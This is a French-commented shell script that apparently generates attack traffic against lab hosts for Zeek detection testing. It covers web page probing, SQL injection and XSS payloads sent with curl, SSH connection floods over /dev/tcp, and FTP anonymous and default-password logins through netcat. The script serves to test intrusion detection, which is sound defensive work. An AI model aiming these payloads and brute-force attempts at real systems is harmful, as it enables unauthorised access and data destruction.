#!/bin/sh

echo "=== DÉBUT DU SCÉNARIO D'ATTAQUE MULTICIBLE ==="

# --- CIBLE 1 : WEB (HTTP) ---
echo "[*] --- ATTAQUES SUR WEB_TARGET ---"

# 1. Scan Web (Simple)
for page in admin login dashboard secret config; do
    curl http://web_target/$page > /dev/null 2>&1
    echo "Tentative accès : /$page"
done
sleep 2

# 2. Injection SQL (Simulée)
echo "[*] Tentative Injection SQL"
curl "http://web_target/product?id=1' OR '1'='1" > /dev/null 2>&1
curl "http://web_target/user?id=1; DROP TABLE users--" > /dev/null 2>&1
sleep 2

# 3. XSS (Cross Site Scripting)
echo "[*] Tentative XSS"
curl "http://web_target/search?q=<script>alert('HACKED')</script>" > /dev/null 2>&1


# --- CIBLE 2 : SSH ---
echo "[*] --- ATTAQUES SUR SSH_TARGET ---"

# Simulation de Brute Force
# On utilise 'nc' (netcat) pour simuler des tentatives de connexion TCP
# Le but est de générer des logs 'auth_failure' dans Zeek, pas de vraiment cracker le password
echo "[*] Simulation Brute Force SSH (50 tentatives)"

for i in {1..50}; do
    # Timeout de 1 seconde pour passer à la suivante rapidement
    # On ouvre une connexion vers le port 22 et on la ferme vite
    timeout 0.5 bash -c "echo > /dev/tcp/ssh_target/22" 2>&1
    echo "Tentative SSH #$i"
done


# --- CIBLE 3 : FTP ---
echo "[*] --- ATTAQUES SUR FTP_TARGET ---"

# 1. Test de login anonyme
echo "[*] Test Login Anonyme"
( echo USER anonymous; echo PASS anonymous; echo QUIT ) | nc -w 1 ftp_target 21 > /dev/null

# 2. Brute Force FTP (Simulation via netcat)
echo "[*] Simulation Brute Force FTP"
users="root admin ftp admin1 test user"
for u in $users; do
    ( echo USER $u; echo PASS password123; echo QUIT ) | nc -w 1 ftp_target 21 > /dev/null
    echo "Tentative FTP user: $u"
done

# 3. Scan de ports FTP (recherche de ports alternatifs)
echo "[*] Scan de ports alternatifs FTP"
for port in 21 80 443 8080; do
    timeout 0.5 bash -c "echo > /dev/tcp/ftp_target/$port" 2>&1
done

echo "=== FIN DES ATTAQUES ==="
